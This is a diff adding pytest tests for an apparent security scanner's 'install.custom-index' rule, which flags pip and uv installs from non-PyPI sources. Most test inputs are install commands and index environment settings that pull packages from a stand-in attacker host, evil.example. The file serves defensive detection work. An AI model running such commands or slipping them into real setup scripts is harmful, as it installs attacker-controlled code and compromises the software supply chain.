@@ -268,3 +268,42 @@ def test_pip_install_from_non_pypi_index_is_med(rel, text):
 ])
 def test_pip_install_from_pypi_is_not_flagged(text):
     assert not [f for f in run_static_rules([ScanFile("setup.sh", text)], []) if f.rule == "install.custom-index"]
+
+
+@pytest.mark.parametrize("text", [
+    "uv pip install --index https://evil.example/simple x\n",
+    "uv pip install --default-index https://evil.example/simple x\n",
+    "pip install --find-links https://evil.example/wheels x\n",
+    "pip install -f https://evil.example/wheels x\n",
+    "pip install https://evil.example/x-1-py3-none-any.whl\n",
+    "uv pip install git+https://evil.example/x.git\n",
+    "pip install 'x @ https://evil.example/x-1.tar.gz'\n",
+    "PIP_INDEX_URL=https://evil.example/simple pip install x\n",
+    "export UV_INDEX_URL=https://evil.example/simple\n",
+    "UV_DEFAULT_INDEX=https://evil.example/simple uv sync\n",
+    "uv add --index https://evil.example/simple x\n",
+    "uv add --index evil=https://evil.example/simple x\n",
+])
+def test_custom_index_forms_are_med(text):
+    """Fix round 3 (M10): uv's own index flags, find-links, direct URLs, index env assignments, uv add."""
+    got = [f for f in run_static_rules([ScanFile("setup.sh", text)], []) if f.rule == "install.custom-index"]
+    assert got and got[0].severity == Severity.MED, text
+
+
+def test_custom_index_env_in_python():
+    t = "import os\nos.environ['PIP_INDEX_URL'] = 'https://evil.example/simple'\n"
+    assert [f for f in run_static_rules([ScanFile("run.py", t)], []) if f.rule == "install.custom-index"]
+
+
+@pytest.mark.parametrize("text", [
+    "uv pip install --index https://pypi.org/simple x\n",
+    "pip install -f ./wheels x\n",
+    "pip install https://files.pythonhosted.org/packages/a/x-1-py3-none-any.whl\n",
+    "PIP_INDEX_URL=https://pypi.org/simple pip install x\n",
+    "uv add requests\n",
+    "pip install requests  # docs: https://example.com/x\n",
+    "pip install --index-strategy unsafe-best-match x\n",
+    "curl https://example.com/install-notes.txt\n",
+])
+def test_custom_index_negatives(text):
+    assert not [f for f in run_static_rules([ScanFile("setup.sh", text)], []) if f.rule == "install.custom-index"], text
